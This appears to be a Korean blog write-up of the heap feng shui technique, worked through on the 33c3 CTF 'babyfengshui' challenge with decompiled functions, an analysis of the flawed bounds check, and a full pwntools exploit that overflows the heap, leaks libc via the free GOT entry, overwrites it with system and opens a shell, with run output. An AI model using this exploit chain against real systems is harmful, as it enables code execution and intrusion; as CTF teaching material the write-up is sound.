---
title: Heap Feng Shui
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, heap feng shui]
math: true
mermaid: true
---

## Description

heap 영역에 할당된 chunk의 레이아웃을 조작하여 Exploit을 용이하게 하는 기법이다.

## Proof of concept

[33c3 CTF - babyfengshui](https://github.com/bkth/babyfengshui)

### main()

Add, Delete, Display, Update, Exit 5가지 기능이 있다.

```
void __cdecl __noreturn main()
{
  char v0; // [esp+3h] [ebp-15h]
  int v1; // [esp+4h] [ebp-14h]
  size_t v2; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  alarm(0x14u);
  while ( 1 )
  {
    puts("0: Add a user");
    puts("1: Delete a user");
    puts("2: Display a user");
    puts("3: Update a user description");
    puts("4: Exit");
    printf("Action: ");
    if ( __isoc99_scanf("%d", &v1) == -1 )
      break;
    if ( !v1 )
    {
      printf("size of description: ");
      __isoc99_scanf("%u%c", &v2, &v0);
      sub_8048816(v2);
    }
    if ( v1 == 1 )
    {
      printf("index: ");
      __isoc99_scanf("%d", &v2);
      sub_8048905(v2);
    }
    if ( v1 == 2 )
    {
      printf("index: ");
      __isoc99_scanf("%d", &v2);
      sub_804898F(v2);
    }
    if ( v1 == 3 )
    {
      printf("index: ");
      __isoc99_scanf("%d", &v2);
      sub_8048724(v2);
    }
    if ( v1 == 4 )
    {
      puts("Bye");
      exit(0);
    }
    if ( (unsigned __int8)byte_804B069 > 0x31u )
    {
      puts("maximum capacity exceeded, bye");
      exit(0);
    }
  }
  exit(1);
}
```

### USER 구조체

```
struct USER{
  char *desc;
  char name[124];
};
```

### AddAUser

- a1를 인자로 전달받아 al(size) 만큼 malloc 후 userInfo를 0x80만큼 malloc
- desc를 userInfo의 desc에 저장
- 이름을 입력받은 후 (char *)gUserList[(unsigned __int8)gCnt] + 4(userInfo->name)에 저장
- UpdateAUserDescription에 gCnt를 전달

```
_DWORD *__cdecl AddAUser(size_t a1)
{
void *desc; // ST24_4
_DWORD *userInfo; // ST28_
desc = malloc(a1);
memset(desc, 0, a1);
userInfo = malloc(0x80u);
memset(userInfo, 0, 0x80u);
*userInfo = desc;
gUserList[(unsigned __int8)gCnt] = userInfo;
printf("name: ");
setText((char *)gUserList[(unsigned __int8)gCnt] + 4, 124);
UpdateAUserDescription(++gCnt - 1);
return userInfo;
}
```

### DeleteAUser

- a1을 인자로 전달받아 *(void )gUserList\[a1\](desc)와 gUserList\[a1\]을 free 후 0 저장

```
unsigned int __cdecl DeleteAUser(unsigned __int8 a1)
{
unsigned int v2; // [esp+1Ch] [ebp-Ch
v2 = __readgsdword(0x14u);
if ( a1 < (unsigned __int8)gCnt && gUserList[a1] )
{
    free(*(void )gUserList[a1]);
    free(gUserList[a1]);
    gUserList[a1] = 0;
}
return __readgsdword(0x14u) ^ v2;
}
```

### DisplayAUser

- a1을 전달받아 name과 description 출력

```
unsigned int __cdecl DisplayAUser(unsigned __int8 a1)
{
unsigned int v2; // [esp+1Ch] [ebp-Ch
v2 = __readgsdword(0x14u);
if ( a1 < (unsigned __int8)gCnt && gUserList[a1] )
{
    printf("name: %s\n", (char *)gUserList[a1] + 4);
    printf("description: %s\n", *(_DWORD *)gUserList[a1]);
}
return __readgsdword(0x14u) ^ v2;
}
```

### UpdateAUserDescription

- a1이 gCnt보다 작고 gUserList\[a1\]이 0이 아닌지 체크
- text_length를 입력받고 "&gUserList\[a1\]->desc\[textLength\]"의 주소가 "gUserList\[a1\] - 4" 보다 큰지 체크
- desc 영역에 입력할 값이 userInfo 영역을 침범하는지 확인하는 바운더리 체크

```
unsigned int __cdecl UpdateAUserDescription(unsigned __int8 a1)
{
char v2; // [esp+17h] [ebp-11h]
int text_length; // [esp+18h] [ebp-10h]
unsigned int v4; // [esp+1Ch] [ebp-Ch]
v4 = __readgsdword(0x14u);
if ( a1 < (unsigned __int8)gCnt && gUserList[a1] )
{
    text_length = 0;
    printf("text length: ");
    __isoc99_scanf("%u%c", &text_length, &v2);
    if ( (char *)(text_length + *(_DWORD *)gUserList[a1]) >= (char *)gUserList[a1] - 4 )
    {
    puts("my l33t defenses cannot be fooled, cya!");
    exit(1);
    }
    printf("text: ");
    setText(*(char )gUserList[a1], text_length + 1);
}
return __readgsdword(0x14u) ^ v4;
}
```

### Vulnerabilities

순차적으로 description, userinfo 영역이 할당된다. 하지만 처음 등록된 유저를 삭제할 경우 할당된 heap 영역이 해제되어 fastbin\[0\], unsortedbin(136) 공간이 생성되고, 새로운 유저 등록 시 description의 영역으로 unsortedbin(136) 영역 할당한다. 해당 계정이 할당받은 description 영역과, User *userInfo 영역 사이 다른 계정 정보가 위치하게 된다. 이로 인해 heap feng shui가 뜻하는 heap 레이아웃을 활용하여 exploit 가능하다.

“text_length"의 값으로 유저 생성 시 입력했던 Description 영역의 크기보다 큰 값을 입력하여 조건문 통과 가능하며, 조건문을 우회함으로써 heap overflow도 가능하다.

## Exploit code

```c
from pwn import *

def add_user(size_of_description,name,text):
    p.recvuntil('Action:')
    p.sendline('0')
    p.recvuntil('size of description:')
    p.sendline(size_of_description)
    p.recvuntil('name:')
    p.sendline(name)
    p.recvuntil('text length:')
    p.sendline(str(len(text)))
    p.recvuntil('text:')
    p.sendline(text)

def display_user(index):
    p.recvuntil('Action:')
    p.sendline('2')
    p.recvuntil('index:')
    p.sendline(index)

def delete_user(index):
    p.recvuntil('Action:')
    p.sendline('1')
    p.recvuntil('index:')
    p.sendline(index)   

def update_user(index,text):
    p.recvuntil('Action:')
    p.sendline('3')
    p.recvuntil('index:')
    p.sendline(index)   
    p.recvuntil('text length:')
    p.sendline(str(len(text)))
    p.recvuntil('text:')
    p.sendline(text)

p=process('babyfengshui')
add_user('10','AAAA','BBBB') # 0
add_user('10','AAAA','BBBB') # 1
add_user('10','AAAA','/bin/sh') # 2

delete_user('0')

# Overflow user\[1\]'s desc
# free got : 0x0804b010 
add_user('124','Heap Overflow','D'*0x98+'\x10\xb0\x04\x08')

# free addr leak
display_user('1')
p.recvuntil('description: ')

free_addr = u32(p.recvn(4))
libc_base = free_addr - 0x71470
system_addr = libc_base +  0x3ada0

log.info('libc base : ' + hex(libc_base))
log.info('free addr : ' + hex(free_addr))
log.info('system addr : ' + hex(system_addr))

# Overwrite user\[1\]'s desc(free_got) to system addr
update_user('1',p32(system_addr))

# system('/bin/sh')
delete_user('2')

p.interactive()
```

## Exploit

```bash
$ python ex.py 
[!] Could not find executable 'babyfengshui' in $PATH, using './babyfengshui' instead
[+] Starting local process './babyfengshui': pid 18867
[*] libc base : 0xf7d50000
[*] free addr : 0xf7dc1470
[*] system addr : 0xf7d8ada0
[*] Switching to interactive mode
 $ id
uid=1000(bs) gid=1000(bs) groups=1000(bs),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ pwd
/home/bs/Desktop/pwnable/heap_feng_shui
```

## References
- [12.Heap Feng Shui](https://www.lazenca.net/display/TEC/12.Heap+Feng+Shui)